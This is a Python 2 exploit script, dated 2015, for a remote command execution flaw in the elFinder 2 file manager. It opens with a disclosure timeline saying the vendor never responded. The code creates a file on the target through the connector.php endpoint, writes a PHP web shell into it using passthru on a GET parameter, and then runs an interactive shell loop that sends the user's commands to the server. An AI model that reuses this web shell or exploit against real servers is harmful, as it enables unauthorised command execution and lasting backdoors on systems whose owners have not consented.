#[+] Author: TUNISIAN CYBER
#[+] Title: elFinder 2 Remote Command Execution (Via File Creation) Vulnerability
#[+] Date: 06-05-2015
#[+] Vendor: https://github.com/Studio-42/elFinder
#[+] Type: WebAPP
#[+] Tested on: KaliLinux (Debian)
#[+] Twitter: @TCYB3R
#[+] Time Line:
#    03-05-2015:Vulnerability Discovered
#    03-05-2015:Contacted Vendor
#    04-05-2015:No response
#    05-05-2015:No response
#    06-05-2015:No response
#    06-05-2015:Vulnerability published

import cookielib, urllib
import urllib2
import sys

print"\x20\x20+-------------------------------------------------+"
print"\x20\x20| elFinder Remote Command Execution Vulnerability |"
print"\x20\x20|                 TUNISIAN CYBER                  |"
print"\x20\x20+-------------------------------------------------+"


host = raw_input('\x20\x20Vulnerable Site:')
evilfile = raw_input('\x20\x20EvilFileName:')
path=raw_input('\x20\x20elFinder s Path:')


tcyber = cookielib.CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(tcyber))

create = opener.open('http://'+host+'/'+path+'/php/connector.php?cmd=mkfile&name='+evilfile+'&target=l1_Lw')
#print create.read()

payload = urllib.urlencode({
                            'cmd' : 'put',
                            'target' : 'l1_'+evilfile.encode('base64','strict'),
                            'content' : '<?php passthru($_GET[\'cmd\']); ?>'
                            })

write = opener.open('http://'+host+'/'+path+'/php/connector.php', payload)
#print write.read()
print '\n'
while True:
    try:
        cmd = raw_input('[She3LL]:~# ')

        execute = opener.open('http://'+host+'/'+path+'/admin/js/plugins/elfinder/files/'+evilfile+'?cmd='+urllib.quote(cmd))
        reverse = execute.read()
        print reverse;

        if cmd.strip() == 'exit':
            break

    except Exception:
        break

sys.exit()